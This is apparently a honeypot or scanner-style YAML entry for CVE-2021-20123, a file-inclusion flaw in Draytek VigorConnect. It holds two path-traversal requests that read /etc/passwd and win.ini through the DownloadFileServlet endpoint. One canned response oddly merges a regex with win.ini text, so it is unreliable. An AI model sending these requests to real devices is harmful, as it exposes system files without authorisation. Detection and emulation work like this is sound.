id: CVE-2021-20123
info:
  name: Draytek VigorConnect 1.6.0-B - Local File Inclusion
  author: 0x_Akoko
  description: 'Draytek VigorConnect 1.6.0-B3 is susceptible to local file inclusion
    in the file download functionality of the DownloadFileServlet endpoint. An unauthenticated
    attacker could leverage this vulnerability to download arbitrary files from the
    underlying operating system with root privileges.

    '
  severity: high
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    read sensitive files on the server, potentially leading to unauthorized access
    or information disclosure.

    '
  remediation: 'Apply the latest security patches or updates provided by the vendor
    to fix the LFI vulnerability in Draytek VigorConnect 1.6.0-B.

    '
  reference:
  - https://www.tenable.com/security/research/tra-2021-42
  - https://nvd.nist.gov/vuln/detail/CVE-2021-20123
  - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2021-20123
    cwe-id: CWE-22
    epss-score: 0.03354
    epss-percentile: 0.91162
    cpe: cpe:2.3:a:draytek:vigorconnect:1.6.0:beta3:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: draytek
    product: vigorconnect
    shodan-query: http.html:"VigorConnect"
  tags: cve2021,cve,draytek,lfi,vigorconnect,tenable
traps:
- request:
    method: GET
    path: /ACSServer/DownloadFileServlet?show_file_name=../../../../../../etc/passwd&type=uploadfile&path=anything
    headers: null
    body: null
  response:
    status_code: 200
    headers: {}
    body: root:.*:0:0:for 16-bit app support
- request:
    method: GET
    path: /ACSServer/DownloadFileServlet?show_file_name=../../../../../../windows/win.ini&type=uploadfile&path=anything
    headers: null
    body: null
  response:
    status_code: 200
    headers: {}
    body: ''
